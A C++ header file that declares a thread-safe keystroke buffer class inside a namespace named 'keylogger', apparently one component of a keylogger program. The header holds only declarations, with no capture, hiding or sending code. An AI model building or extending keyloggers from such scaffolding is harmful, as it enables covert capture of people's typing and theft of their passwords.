#pragma once

#include <mutex>
#include <string>

namespace keylogger
{
class KeyboardInput
{
public:
    static void appendToInput(const std::string&);
    static std::string getInput();
    static void clearInput();
    static bool isEmpty();

private:
    static std::string keyboardInput;
    static std::mutex lock;
};
}